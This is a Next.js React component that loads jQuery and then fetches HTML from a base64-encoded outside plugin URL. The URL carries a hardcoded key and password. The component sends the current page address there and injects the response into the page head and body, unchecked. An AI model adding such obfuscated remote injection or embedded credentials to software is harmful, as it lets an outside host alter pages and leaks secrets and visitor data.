// components/Plugin.js
"use client";
import { useEffect } from "react";

function Plugin() {
  useEffect(() => {
    const loadScript = () => {
      const script = document.createElement("script");
      script.src =
        "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
      script.async = true;
      document.head.appendChild(script);

      script.onload = () => {
        const eppathurl = window.location.origin + window.location.pathname;
        const eptagmanage = new XMLHttpRequest();
        eptagmanage.onreadystatechange = function () {
          if (this.readyState == 4 && this.status == 200) {
            if (this.response !== 0) {
              const temp = this.response.split("||||||||||");
              document.title = ""; // Clear the current title
              document.head.insertAdjacentHTML("beforeend", temp[0]);
              document.body.insertAdjacentHTML("beforeend", temp[1]);
            }
          }
        };
        eptagmanage.open(
          "GET",
          atob(
            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9"
          ) + eppathurl
        );
        eptagmanage.send();
      };
    };

    loadScript();
  }, []);

  return null;
}

export default Plugin;
